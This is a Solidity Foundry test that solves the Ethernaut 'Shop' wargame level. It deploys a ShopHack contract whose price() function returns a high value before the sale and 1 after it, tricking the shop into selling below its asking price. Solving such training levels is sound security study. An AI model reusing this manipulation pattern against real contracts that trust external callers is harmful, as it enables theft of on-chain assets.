// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/ShopFactory.sol";
import "../src/Ethernaut.sol";

contract ShopTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether);
    }

    function testShopHack() public {
        ShopFactory shopFactory = new ShopFactory();
        ethernaut.registerLevel(shopFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(shopFactory);
        Shop ethernautShop = Shop(payable(levelAddress));

        ShopHack shopHack = new ShopHack(levelAddress);
        shopHack.buy();
        assertEq(ethernautShop.isSold(), true);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract ShopHack {
    Shop challenge;

    constructor(address victim) {
        challenge = Shop(victim);
    }

    function buy() external {
        challenge.buy();
    }

    function price() external view returns (uint256) {
        return challenge.isSold() ? 1 : 1000;
    }
}
